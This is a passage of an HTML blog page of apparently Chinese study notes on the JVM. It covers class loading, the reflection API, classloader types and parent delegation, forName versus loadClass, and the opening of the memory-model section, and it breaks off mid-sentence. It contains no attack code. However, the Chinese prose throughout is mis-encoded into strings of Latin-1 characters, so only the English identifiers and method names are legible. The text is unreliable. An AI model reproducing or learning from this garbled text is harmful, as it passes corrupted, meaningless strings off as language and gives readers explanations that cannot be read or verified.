href="#%E4%B8%A4%E7%A7%8D%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB">ä¸¤ç§ç±»åŠ è½½æ–¹å¼çš„åŒºåˆ«ï¼š</a></li><li><a href="#forname%E5%92%8Cloadclass%E7%9A%84%E5%8C%BA%E5%88%AB">forNameå’ŒloadCLassçš„åŒºåˆ«ï¼š</a></li></ul></li><li><a href="#java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B">Javaå†…å­˜æ¨¡å‹</a><ul><li><a href="#%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B">å†…å­˜ç®€ä»‹</a></li><li><a href="#%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E7%9A%84%E5%88%92%E5%88%86">åœ°å€ç©ºé—´çš„åˆ’åˆ†</a></li><li><a href="#jvm%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B">JVMå†…å­˜æ¨¡å‹</a><ul><li><a href="#%E7%A8%8B%E5%BA%8F%E8%AE%A1%E6%95%B0%E5%99%A8program-counter-register">ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰</a></li><li><a href="#java%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88stack">Javaè™šæ‹Ÿæœºæ ˆï¼ˆStackï¼‰</a><ul><li><a href="#%E9%80%92%E5%BD%92%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%BC%95%E5%8F%91javalangstackoverflowerror%E5%BC%82%E5%B8%B8">é€’å½’ä¸ºä»€ä¹ˆä¼šå¼•å‘java.lang.StackOverflowErrorå¼‚å¸¸</a></li></ul></li><li><a href="#%E6%9C%AC%E5%9C%B0%E6%96%B9%E6%B3%95%E6%A0%88">æœ¬åœ°æ–¹æ³•æ ˆ</a></li><li><a href="#%E5%85%83%E7%A9%BA%E9%97%B4%E4%B8%8E%E6%B0%B8%E4%B9%85%E4%BB%A3">å…ƒç©ºé—´ä¸æ°¸ä¹…ä»£</a><ul><li><a href="#metaspace%E7%9B%B8%E6%AF%94permgen%E7%9A%84%E4%BC%98%E5%8A%BF">MetaSpaceç›¸æ¯”PermGençš„ä¼˜åŠ¿</a></li></ul></li><li><a href="#java%E5%A0%86heap">Javaå †ï¼ˆHeapï¼‰</a></li><li><a href="#java%E4%B8%89%E5%A4%A7%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%E5%8F%82%E6%95%B0-xms-xmx-xss%E7%9A%84%E5%90%AB%E4%B9%89">Javaä¸‰å¤§æ€§èƒ½è°ƒä¼˜å‚æ•°-Xms â€“Xmx â€“Xssçš„å«ä¹‰</a></li><li><a href="#java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E4%B8%AD%E5%A0%86%E5%92%8C%E6%A0%88%E7%9A%84%E5%8C%BA%E5%88%AB-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5-">Javaå†…å­˜æ¨¡å‹ä¸­å †å’Œæ ˆçš„åŒºåˆ«-å†…å­˜åˆ†é…ç­–ç•¥ã€-ã€‘</a></li><li><a href="#%E5%85%83%E7%A9%BA%E9%97%B4-%E5%A0%86-%E7%BA%BF%E7%A8%8B%E7%8B%AC%E5%8D%A0%E9%83%A8%E5%88%86%E9%97%B4%E7%9A%84%E8%81%94%E7%B3%BB-%E5%86%85%E5%AD%98%E8%A7%92%E5%BA%A6">å…ƒç©ºé—´ã€å †ã€çº¿ç¨‹ç‹¬å éƒ¨åˆ†é—´çš„è”ç³»-å†…å­˜è§’åº¦ã€ã€‘</a></li><li><a href="#%E4%B8%8D%E5%90%8Cjdk%E7%89%88%E6%9C%AC%E9%97%B4intern%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB">ä¸åŒJDKç‰ˆæœ¬é—´intern()æ–¹æ³•çš„åŒºåˆ«</a></li></ul></li></ul></li><li><a href="#%E5%BC%95%E5%85%A5">å¼•å…¥</a></li><li><a href="#%E5%AD%97%E9%9D%A2%E9%87%8F%E5%92%8C%E8%BF%90%E8%A1%8C%E6%97%B6%E5%B8%B8%E9%87%8F%E6%B1%A0">å­—é¢é‡å’Œè¿è¡Œæ—¶å¸¸é‡æ± </a><ul><li><a href="#%E8%A1%A5%E5%85%85">è¡¥å……:</a></li></ul></li><li><a href="#new-string%E5%88%9B%E5%BB%BA%E4%BA%86%E5%87%A0%E4%B8%AA%E5%AF%B9%E8%B1%A1">new Stringåˆ›å»ºäº†å‡ ä¸ªå¯¹è±¡</a></li><li><a href="#%E8%BF%90%E8%A1%8C%E6%97%B6%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95">è¿è¡Œæ—¶å¸¸é‡æ± çš„åŠ¨æ€æ‰©å±•</a></li><li><a href="#intern-%E7%9A%84%E6%AD%A3%E7%A1%AE%E7%94%A8%E6%B3%95">intern çš„æ­£ç¡®ç”¨æ³•</a></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><!-- tocstop --><h2><span id="å¯¹javaçš„ç†è§£">å¯¹Javaçš„ç†è§£</span></h2><table><thead><tr><th align="center">å¹³å°æ— å…³æ€§</th><th align="center">é¢å‘å¯¹è±¡</th></tr></thead><tbody><tr><td align="center">GC</td><td align="center">ç±»åº“</td></tr><tr><td align="center">è¯­è¨€ç‰¹æ€§</td><td align="center">å¼‚å¸¸å¤„ç†</td></tr></tbody></table><p><img src="/2020/03/29/JVM/image-20200329101756779.png"></p><h2><span id="compile-once-run-anywhereå¦‚ä½•å®ç°">Compile Once, Run Anywhereå¦‚ä½•å®ç°</span></h2><p>Javapæ˜¯jdkè‡ªå¸¦çš„åæ±‡ç¼–å™¨ï¼Œå¯ä»¥æŸ¥çœ‹javaç¼–è¯‘å™¨ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„å­—èŠ‚ç ã€‚                               </p><p><img src="/2020/03/29/JVM/image-20200329101856128.png"></p><p><img src="/2020/03/29/JVM/image-20200329101916755.png"></p><ul><li><p>Javaæºç ä¼šè¢«ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶ï¼Œå†ç”±ä¸åŒå¹³å°çš„JVMè§£æ</p></li><li><p>Javaè¯­è¨€åœ¨ä¸åŒå¹³å°ä¸Šè¿è¡Œæ—¶ä¸éœ€è¦é‡æ–°ç¼–è¯‘</p></li><li><p>JVMåœ¨æ‰§è¡Œå­—èŠ‚ç æ—¶ä¼šå°†å…¶è½¬æ¢ä¸ºå…·ä½“å¹³å°çš„æœºå™¨æŒ‡ä»¤</p></li></ul><h2><span id="ä¸ºä»€ä¹ˆjvmä¸ç›´æ¥å°†æºç è§£ææˆæœºå™¨ç å»æ‰§è¡Œ">ä¸ºä»€ä¹ˆJVMä¸ç›´æ¥å°†æºç è§£ææˆæœºå™¨ç å»æ‰§è¡Œ</span></h2><ul><li><p>è£…å¤‡å·¥ä½œï¼šæ¯æ¬¡æ‰§è¡Œéƒ½éœ€è¦å„ç§æ£€æŸ¥</p></li><li><p>ç”Ÿæˆå­—èŠ‚ç è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨å¯ä»¥é¢„å…ˆä½œè¯­æ³•é”™è¯¯æˆ–è€…å®‰å…¨æ€§æ–¹é¢çš„æ£€æŸ¥ï¼Œå‡ºé”™æœºä¼šæ›´å°‘</p></li><li><p>å…¼å®¹æ€§ï¼šä¹Ÿå¯ä»¥å°†åˆ«çš„è¯­è¨€è§£ææˆå­—èŠ‚ç </p></li></ul><h2><span id="jvmå¦‚ä½•åŠ è½½classæ–‡ä»¶">JVMå¦‚ä½•åŠ è½½.classæ–‡ä»¶</span></h2><p>ä¸»è¦æœ‰ è£…è½½ã€é“¾æ¥å’Œåˆå§‹åŒ– </p><p>JVMé€šè¿‡ClassLoaderåŠ è½½classå­—èŠ‚ç æ–‡ä»¶ï¼Œç”ŸæˆClasså¯¹è±¡</p><ul><li><p>æ ¡éªŒï¼šæ£€æŸ¥åŠ è½½æ–‡ä»¶çš„æ­£ç¡®æ€§å’Œå®‰å…¨æ€§</p></li><li><p>å‡†å¤‡ï¼šç»™ç±»ä¸­çš„é™æ€å˜é‡åˆ†é…å­˜å‚¨ç©ºé—´ã€‚</p></li><li><p>è§£æï¼šå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨</p></li></ul><p>åˆå§‹åŒ–ï¼šå¯¹é™æ€å˜é‡å’Œé™æ€ä»£ç å—æ‰§è¡Œåˆå§‹åŒ–å·¥ä½œ</p><p><img src="/2020/03/29/JVM/image-20200329102811874.png"></p><h2><span id="åå°„">åå°„</span></h2><p>JAVAåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡éƒ½èƒ½è°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶</p><p> <img src="/2020/03/29/JVM/image-20200329103352571.png">                             </p><p> <img src="/2020/03/29/JVM/image-20200329103359919.png"></p><h3><span id="è·å–æ„é€ å‡½æ•°">è·å–æ„é€ å‡½æ•°</span></h3><p>ã€€ã€€ã€€getDeclaredConstructors();ã€€ã€€ã€€ã€€è·å–æ‰€æœ‰çš„æ„é€ å‡½æ•°</p><p>ã€€ã€€ã€€getDeclaredConstructor(å‚æ•°ç±»å‹);ã€€ã€€è¿™ä¸ªæ–¹æ³•ä¼šè¿”å›åˆ¶å®šå‚æ•°ç±»å‹çš„</p><p>æ‰€æœ‰æ„é€ å™¨ï¼Œ<strong>åŒ…æ‹¬</strong>publicçš„å’Œépublicçš„ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬privateçš„ã€‚</p><p>ã€€ã€€ã€€getConstructors();ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€è·å–æ‰€æœ‰å…¬å¼€çš„æ„é€ å‡½æ•°</p><p>ã€€ã€€ã€€getConstructor(å‚æ•°ç±»å‹);ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€è·å–å•ä¸ªå…¬å¼€çš„æ„é€ å‡½æ•°</p><h3><span id="è·å–ä¿®é¥°ç¬¦">è·å–ä¿®é¥°ç¬¦</span></h3><p>ã€€ã€€ã€€getModifiers();ã€€ã€€&#x2F;&#x2F;è·å–æ‰€æœ‰ä¿®é¥°ç¬¦</p><p>ã€€ã€€ã€€è¿”å›ç±»å‹ï¼šæ•´æ•°ç±»å‹ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªä¿®é¥°ç¬¦ï¼Œåˆ™è¿”å›ä¸¤ä¸ªä¿®é¥°ç¬¦ä¹‹å’Œï¼Œä¾‹å¦‚public  static void getAll(){  }</p><p>ã€€ã€€ã€€è¿”å›å€¼ä¼šæ˜¯publicå’Œstaticä¹‹å’Œ</p><p>ã€€ã€€ã€€æ•´æ•°å®šä¹‰ï¼š</p><p>ã€€ã€€ã€€0â€“é»˜è®¤ä¸å†™ 1â€“public 2â€“private 4â€“protected<br> ã€€ã€€8â€“static 16â€“final 32â€“synchronized<br> ã€€ã€€64â€“volatile 128â€“transient 256â€“native<br> ã€€ã€€512â€“interface 1024â€“abstract</p><h3><span id="è·å–åå­—">è·å–åå­—</span></h3><p>ã€€ã€€ã€€è¿”å›ç±»å‹ï¼šString,å¯ä»¥åå°„ç±»åï¼Œæ–¹æ³•åï¼Œæ„é€ å‡½æ•°åç­‰ç­‰</p><p>ã€€ã€€ã€€getName();ã€€ã€€ã€€ã€€&#x2F;&#x2F;è·å–å…¨å ä¾‹å¦‚ï¼šcom.bean.Book</p><p>ã€€ã€€ã€€getSimpleName()ã€€ã€€&#x2F;&#x2F;è·å–ç±»å ä¾‹å¦‚ï¼šBook</p><h3><span id="è·å–å­—æ®µå±æ€§">è·å–å­—æ®µï¼ˆå±æ€§ï¼‰</span></h3><p>ã€€ã€€ã€€getFields()ã€€ã€€ã€€&#x2F;&#x2F;è¿”å›ä¸€ä¸ªFieldç±»å‹æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç±»çš„publicå­—æ®µï¼Œå¦‚æœæ­¤ç±»ç»§æ‰¿äºæŸä¸ªçˆ¶ç±»ï¼ŒåŒæ—¶åŒ…æ‹¬çˆ¶ç±»çš„publicå­—æ®µã€‚å…¶å®ƒçš„protecedå’Œprivateå­—æ®µï¼Œæ— è®ºæ˜¯å±äºå½“å‰ç±»è¿˜æ˜¯çˆ¶ç±»éƒ½ä¸è¢«æ­¤æ–¹æ³•è·å–ã€‚</p><p>ã€€ã€€ã€€getField(String name)ã€€ã€€&#x2F;&#x2F;å‚æ•°å¯ä»¥æŒ‡å®šå­—æ®µã€€ã€€è·å–å•ä¸ªpublicå­—æ®µ</p><p>ã€€ã€€ã€€</p><p>ã€€ã€€ã€€getDeclaredFields()ã€€ã€€&#x2F;&#x2F;è¿”å›ä¸€ä¸ªFieldç±»å‹æ•°ç»„ï¼Œç»“æœåŒ…å«å½“å‰ç±»çš„æ‰€æœ‰å­—æ®µï¼Œprivateã€protectedã€publicæˆ–è€…æ— ä¿®é¥°ç¬¦éƒ½åœ¨å†…ã€‚å¦å¤–ï¼Œæ­¤æ–¹æ³•è¿”å›çš„ç»“æœä¸åŒ…æ‹¬çˆ¶ç±»çš„ä»»ä½•å­—æ®µã€‚ æ­¤æ–¹æ³•åªæ˜¯é’ˆå¯¹å½“å‰ç±»çš„ã€‚</p><p>ã€€ã€€ã€€getDeclaredField(String name)ã€€ã€€&#x2F;&#x2F;è·å–å•ä¸ªå­—æ®µ å‚æ•°å¯ä»¥æŒ‡å®šå­—æ®µ</p><h3><span id="è·å–æ–¹æ³•">è·å–æ–¹æ³•</span></h3><p>ã€€ã€€ã€€getMethods()ã€€ã€€&#x2F;&#x2F;<strong>è¿”å›å½“å‰Classå¯¹è±¡è¡¨ç¤ºçš„ç±»æˆ–æ¥å£çš„æ‰€æœ‰å…¬æœ‰æˆå‘˜æ–¹æ³•å¯¹è±¡æ•°ç»„,åŒ…æ‹¬å·²å£°æ˜çš„å’Œä»çˆ¶ç±»ç»§æ‰¿æˆ–å®ç°æ¥å£çš„æ–¹æ³•</strong>ã€€ã€€ã€€getMethod(String name)ã€€ã€€&#x2F;&#x2F;è·å–å•ä¸ªå…¬å¼€çš„æ–¹æ³•ï¼Œå‚æ•°æ˜¯å¯ä»¥æŒ‡å®šæ–¹æ³•å</p><p>ã€€    getDeclaredMethods()ã€€ã€€ã€€&#x2F;&#x2F;è·å–æ‰€æœ‰çš„æ–¹æ³•</p><p>ã€€ã€€ã€€æ³¨æ„ï¼šå®ƒä¸ä¼šè·å–ç³»ç»Ÿè‡ªå¸¦çš„æ–¹æ³•ï¼Œ<strong>ä¸</strong>åŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿å’Œæ¥å£å®ç°çš„æ–¹æ³•</p><p>getDeclaredMethod(String name)ã€€ã€€ã€€ &#x2F;&#x2F;è·å–å•ä¸ªçš„æ‰€æœ‰æ–¹æ³•ã€€å‚æ•°æ˜¯å¯æŒ‡å®šæ–¹æ³•å</p><h3><span id="è®¾ç½®è®¿é—®å±æ€§">è®¾ç½®è®¿é—®å±æ€§</span></h3><p>ã€€ã€€ã€€clz.setAccessible(true)ã€€ã€€&#x2F;&#x2F;å¯è®¿é—®</p><p>ã€€ã€€ã€€clz.setAccessible(false)ã€€ã€€&#x2F;&#x2F;ä¸å¯è®¿é—®</p><h3><span id="ä½¿ç”¨æ–¹æ³•">ä½¿ç”¨æ–¹æ³•</span></h3><p>ã€€ã€€ã€€method.invoke(Object obj,Objectâ€¦ args)</p><p>ã€€ã€€ã€€objï¼šå¦‚æœæ˜¯å®ä¾‹æ–¹æ³•ï¼Œåˆ™æ”¾ä¸ªè¯¥æ–¹æ³•çš„ç±»å¯¹è±¡ç»™å®ƒ</p><p>ã€€ã€€ã€€objï¼šé™æ€æ–¹æ³•ï¼Œå†™null</p><p>ã€€ã€€ã€€argsï¼šæ–¹æ³•çš„å‚æ•°å€¼ï¼Œæ²¡æœ‰å†™nullï¼Œæˆ–ä¸å†™éƒ½è¡Œ </p><h2><span id="ç±»ä»ç¼–è¯‘åˆ°æ‰§è¡Œçš„è¿‡ç¨‹">ç±»ä»ç¼–è¯‘åˆ°æ‰§è¡Œçš„è¿‡ç¨‹</span></h2><p>Ã˜ ç¼–è¯‘å™¨å°†Robot.javaæºæ–‡ä»¶ç¼–è¯‘ä¸ºRobot.classå­—èŠ‚ç æ–‡ä»¶</p><p>Ã˜ ClassLoaderå°†å­—èŠ‚ç è½¬æ¢ä¸ºJVMä¸­çš„Class<robot>å¯¹è±¡</robot></p><p>Ã˜ JVMåˆ©ç”¨class<robot>å¯¹è±¡å®ä¾‹åŒ–ä¸ºRobotå¯¹è±¡</robot></p><h2><span id="è°ˆè°ˆclassloader">è°ˆè°ˆClassLoader</span></h2><p>å®ƒä¸»è¦å·¥ä½œåœ¨Classè£…è½½çš„åŠ è½½é˜¶æ®µï¼Œæ‰€æœ‰çš„Classéƒ½æ˜¯ç”±ClassLoaderè¿›è¡ŒåŠ è½½çš„ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯ä»ç³»ç»Ÿå¤–éƒ¨è·å¾—ClassäºŒè¿›åˆ¶æ•°æ®æµï¼Œç„¶åäº¤ç»™JVMè¿›è¡Œé“¾æ¥ã€åˆå§‹åŒ–ç­‰æ“ä½œã€‚</p><h2><span id="classloaderçš„ç§ç±»">ClassLoaderçš„ç§ç±»</span></h2><p>Ã˜ BootStrapClassLoaderï¼šC++ç¼–å†™ï¼ŒåŠ è½½æ ¸å¿ƒåº“java.*</p><p>Ã˜ ExtClassLoaderï¼šJavaç¼–å†™ï¼ŒåŠ è½½æ‰©å±•åº“Javax.*</p><p>Ã˜ AppClassLoaderï¼šJavaç¼–å†™ï¼ŒåŠ è½½ç¨‹åºæ‰€åœ¨ç›®å½•</p><p>Ã˜ è‡ªå®šä¹‰ClassLoaderï¼šjavaç¼–å†™ï¼Œå®šåˆ¶åŒ–åŠ è½½ </p><h2><span id="ç±»åŠ è½½å™¨åŒäº²å§”æ´¾æ¨¡å‹">ç±»åŠ è½½å™¨åŒäº²å§”æ´¾æ¨¡å‹</span></h2><p><img src="/2020/03/29/JVM/image-20200329105409059.png"></p><p>è‡ªåº•å‘ä¸Šçœ‹å¦‚æœæ›¾ç»åŠ è½½è¿‡ï¼Œå°±ç›´æ¥è¿”å›ã€‚å¦‚æœæ²¡æœ‰å°±å‘ä¸Šå§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ã€‚</p><p>æœ€ç»ˆåˆ°Bootstrap ClassLoaderï¼Œå¦‚æœå®ƒä¹Ÿæ²¡æœ‰ï¼Œåˆ™è¿›å…¥Load JRE\lib\rt.jaræˆ–è€…-Xbootclasspath</p><p>ï¼ˆè¿™ä¸ªå°±æ˜¯å‘½ä»¤è¡Œè¾“å…¥-jar æ¥ä¸ŠjaråŒ…ï¼Œæ¥ä¸Šçš„å‚æ•°ï¼‰é€‰é¡¹æŒ‡å®šçš„jaråŒ…ä¸­å¯»æ‰¾ã€‚</p><p>å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å‘ä¸‹ç»§ç»­å¯»æ‰¾ã€‚</p><p><img src="/2020/03/29/JVM/image-20200329105647977.png"></p><p>ä¸ºä»€ä¹ˆå®ƒä»¬éƒ½æ˜¯extends URLClassLoaderå´èƒ½ä¿è¯çˆ¶ç±»çš„ç»§æ‰¿å…³ç³»ï¼šå³customçˆ¶ç±»æ˜¯appï¼Œappçˆ¶ç±»æ˜¯ext</p><p><img src="/2020/03/29/JVM/image-20200329105703238.png"></p><p>Extçš„parentæ˜¯ç©ºï¼Œbootstrap clsloaderæ˜¯c++çš„</p><h3><span id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹</span></h3><p>ä»¥Systemä¸¾ä¾‹ï¼Œå¦‚æœç±»aæ‰“å°äº†ä¸€å¥è¯åŠ è½½äº†Systemçš„å­—èŠ‚ç ï¼Œç±»bä¹Ÿæ‰“å°ä¸€å¥è¯åå¤åŠ è½½å·²åŠ è½½çš„å­—èŠ‚ç ï¼Œå°±ä¼šé€ æˆå†…å­˜çš„æµªè´¹ã€‚</p><p> é‡‡ç”¨åŒäº²å§”æ´¾çš„ä¸€ä¸ªå¥½å¤„æ˜¯æ¯”å¦‚åŠ è½½ä½äºrt.jaråŒ…ä¸­çš„ç±»java.lang.Objectï¼Œä¸ç®¡æ˜¯å“ªä¸ªåŠ è½½å™¨åŠ è½½è¿™ä¸ªç±»ï¼Œæœ€ç»ˆéƒ½æ˜¯å§”æ‰˜ç»™é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œè¿™æ ·å°±ä¿è¯äº†ä½¿ç”¨ä¸åŒçš„ç±»åŠ è½½å™¨æœ€ç»ˆå¾—åˆ°çš„éƒ½æ˜¯åŒæ ·ä¸€ä¸ªObjectå¯¹è±¡ã€‚</p><h3><span id="ä¸ºä»€ä¹ˆéœ€è¦ç ´ååŒäº²å§”æ´¾">ä¸ºä»€ä¹ˆéœ€è¦ç ´ååŒäº²å§”æ´¾ï¼Ÿ</span></h3><p>å› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹çˆ¶ç±»åŠ è½½å™¨éœ€è¦å§”æ‰˜å­ç±»åŠ è½½å™¨å»åŠ è½½classæ–‡ä»¶ã€‚å—åˆ°åŠ è½½èŒƒå›´çš„é™åˆ¶ï¼Œçˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½åˆ°éœ€è¦çš„æ–‡ä»¶ï¼Œä»¥Driveræ¥å£ä¸ºä¾‹ï¼Œç”±äºDriveræ¥å£å®šä¹‰åœ¨jdkå½“ä¸­çš„ï¼Œè€Œå…¶å®ç°ç”±å„ä¸ªæ•°æ®åº“çš„æœåŠ¡å•†æ¥æä¾›ï¼Œæ¯”å¦‚mysqlçš„å°±å†™äº†<code>MySQL Connector</code>ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼ŒDriverManagerï¼ˆä¹Ÿç”±jdkæä¾›ï¼‰è¦åŠ è½½å„ä¸ªå®ç°äº†Driveræ¥å£çš„å®ç°ç±»ï¼Œç„¶åè¿›è¡Œç®¡ç†ï¼Œä½†æ˜¯DriverManagerç”±å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½ï¼Œåªèƒ½è®°è½½JAVA_HOMEçš„libä¸‹æ–‡ä»¶ï¼Œè€Œå…¶å®ç°æ˜¯ç”±æœåŠ¡å•†æä¾›çš„ï¼Œç”±ç³»ç»Ÿç±»åŠ è½½å™¨åŠ è½½ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å¯åŠ¨ç±»åŠ è½½å™¨æ¥å§”æ‰˜å­ç±»æ¥åŠ è½½Driverå®ç°ï¼Œä»è€Œç ´åäº†åŒäº²å§”æ´¾ï¼Œè¿™é‡Œä»…ä»…æ˜¯ä¸¾äº†ç ´ååŒäº²å§”æ´¾çš„å…¶ä¸­ä¸€ä¸ªæƒ…å†µã€‚</p><h2><span id="ç±»çš„åŠ è½½æ–¹å¼">ç±»çš„åŠ è½½æ–¹å¼</span></h2><p>Ã˜ éšå¼åŠ è½½ new</p><p>Ã˜ æ˜¾å¼åŠ è½½ loadClassï¼ŒforNameç­‰</p><ul><li>ç¬¬ä¸€ç§ï¼šä½¿ç”¨Class.forName(String classPath)ã€€ã€€&#x2F;&#x2F;ClassPathï¼šå†™éœ€è¦åå°„çš„ç±»åï¼Œä¸€èˆ¬æ˜¯ä»¥åŒ…å.ç±»å</li></ul><p>æ³¨æ„äº‹é¡¹ï¼šè¿™é‡Œä¼šäº§ç”Ÿä¸€ä¸ªClassNotFoundExceptionå¼‚å¸¸ï¼Œæˆ‘ä»¬éœ€è¦å°†å¼‚å¸¸å¤„ç†æˆ–è€…æŠ›å‡º</p><p>è¿”å›å€¼ï¼šClasså¯¹è±¡</p><p>â€‹                               </p><ul><li>ç¬¬äºŒç§ï¼šç›´æ¥ä½¿ç”¨Class clz &#x3D; ç±»å.class</li></ul><p>è¿™ç§æƒ…å†µä¸€èˆ¬åœ¨æˆ‘ä»¬çŸ¥é“æœ‰è¿™ä¸ªç±»çš„æ—¶å€™å»ä½¿ç”¨</p><ul><li>ç¬¬ä¸‰ç§ï¼šClass clz &#x3D; å¯¹è±¡. getClass();</li></ul><p>ã€€å‰ææ˜¯å¯¹è±¡å·²ç»è¢«å®ä¾‹åŒ–å‡ºæ¥äº† </p><h3><span id="ä¸¤ç§ç±»åŠ è½½æ–¹å¼çš„åŒºåˆ«">ä¸¤ç§ç±»åŠ è½½æ–¹å¼çš„åŒºåˆ«ï¼š</span></h3><p>Ã˜ éšå¼åŠ è½½èƒ½å¤Ÿç›´æ¥è·å–å¯¹è±¡çš„å®ä¾‹ï¼Œè€Œæ˜¾å¼åŠ è½½éœ€è¦è°ƒç”¨ Class å¯¹è±¡çš„ newInstance() æ–¹æ³•æ¥ç”Ÿæˆå¯¹è±¡çš„å®ä¾‹ã€‚</p><p>Ã˜ éšå¼åŠ è½½èƒ½å¤Ÿä½¿ç”¨æœ‰å‚çš„æ„é€ å‡½æ•°ï¼Œè€Œä½¿ç”¨ Class å¯¹è±¡çš„ newInstance() ä¸æ”¯æŒä¼ å…¥å‚æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨æœ‰å‚çš„æ„é€ å‡½æ•°ï¼Œå¿…é¡»é€šè¿‡åå°„çš„æ–¹å¼ï¼Œæ¥è·å–åˆ°è¯¥ç±»çš„æœ‰å‚æ„é€ æ–¹æ³•ã€‚</p><h3><span id="fornameå’Œloadclassçš„åŒºåˆ«">forNameå’ŒloadCLassçš„åŒºåˆ«ï¼š</span></h3><p>Ã˜ ä½¿ç”¨ loadClass() æ–¹æ³•è·å¾—çš„ Class å¯¹è±¡åªå®Œæˆäº†ç±»è£…è½½è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ­¥ï¼šåŠ è½½ï¼Œåç»­çš„æ“ä½œå‡æœªè¿›è¡Œã€‚ï¼ˆè¿˜æ²¡æœ‰é“¾æ¥çš„ï¼‰</p><p>Ã˜ ä½¿ç”¨ Class.forName() æ–¹æ³•è·å¾— Class å¯¹è±¡æ˜¯å·²ç»æ‰§è¡Œå®Œåˆå§‹åŒ–çš„äº†</p><h2><span id="javaå†…å­˜æ¨¡å‹">Javaå†…å­˜æ¨¡å‹</span></h2><h3><span id="å†…å­˜ç®€ä»‹">å†…å­˜ç®€ä»‹</span></h3><p><img src="/2020/03/29/JVM/image-20200329112332929.png"></p><h3><span id="åœ°å€ç©ºé—´çš„åˆ’åˆ†">åœ°å€ç©ºé—´çš„åˆ’åˆ†</span></h3><p><img src="/2020/03/29/JVM/image-20200329112347172.png"></p><h3><span id="jvmå†…å­˜æ¨¡å‹">JVMå†…å­˜æ¨¡å‹</span></h3><p><img src="/2020/03/29/JVM/image-20200329112436551.png"></p><h4><span id="ç¨‹åºè®¡æ•°å™¨program-counter-register">ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰</span></h4><p>Ã˜ å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç è¡Œå·æŒ‡ç¤ºå™¨ï¼ˆé€»è¾‘ï¼‰</p><p>Ã˜ æ”¹å˜è®¡æ•°å™¨çš„å€¼æ¥é€‰å–ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤</p><p>Ã˜ å’Œçº¿ç¨‹æ˜¯ä¸€å¯¹ä¸€çš„å…³ç³»å³â€œçº¿ç¨‹ç§æœ‰â€</p><p>Ã˜ å¯¹Javaæ–¹æ³•è®¡æ•°ï¼Œå¦‚æœæ˜¯Nativeæ–¹æ³•åˆ™è®¡æ•°å™¨å€¼ä¸ºUndefined</p><p>Ã˜ ä¸ä¼šå‘ç”Ÿå†…å­˜æ³„æ¼</p><h4><span id="javaè™šæ‹Ÿæœºæ ˆstack">Javaè™šæ‹Ÿæœºæ ˆï¼ˆStackï¼‰</span></h4><p><img src="/2020/03/29/JVM/image-20200329112546740.png">                            </p><ul><li><p>Javaè™šæ‹Ÿæœºæ ˆä¿å­˜çš„ä¸»è¦å†…å®¹ä¸ºæ ˆå¸§ï¼Œæ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„æ ˆå¸§è¢«å‹å…¥javaæ ˆï¼Œæ¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ç»“æŸï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªæ ˆå¸§è¢«å¼¹å‡ºjavaæ ˆã€‚</p></li><li><p>æ 